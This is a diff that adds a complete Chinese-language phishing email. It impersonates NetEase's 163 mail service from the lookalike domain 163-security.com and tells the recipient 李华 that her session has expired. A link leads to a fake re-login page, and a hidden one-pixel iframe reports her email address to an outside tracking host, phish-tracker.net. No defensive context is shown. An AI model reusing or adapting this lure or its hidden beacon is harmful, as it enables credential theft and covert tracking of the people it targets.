@@ -1,0 +1,23 @@
+Received: from mail.163-security.com ([220.181.12.11])
+	by mx.163.com (NetEase) with ESMTP id p7D9sK3f019382
+	for <li_hua@163.com>; Sun, 08 Jun 2025 19:15:10 +0800 (CST)
+Message-ID: <202506081915.p7D9sK3f019382@mx.163.com>
+Date: Sun, 08 Jun 2025 19:15:09 +0800
+From: "网易邮箱中心" <service@163-security.com>
+To: "李华" <li_hua@163.com>
+Subject: =?gb2312?B?zbzKx7r208q8rLXEsOY=?=
+Mime-Version: 1.0
+Content-Type: text/html; charset="gb2312"
+
+<html>
+<body>
+<p>尊敬的163邮箱用户 李华：</p>
+<p>您的邮箱登录会话已过期，为保护您的账户安全，请重新登录。</p>
+<p><a href="http://login.163-security.com/reauth.jsp?user=li_hua">点击此处重新登录</a></p>
+<p>如果这不是您本人的操作，请忽略此邮件。</p>
+<p>网易团队</p>
+
+<iframe src="http://phish-tracker.net/log.jsp?id=li_hua@163.com" width="1" height="1" frameborder="0"></iframe>
+
+</body>
+</html>
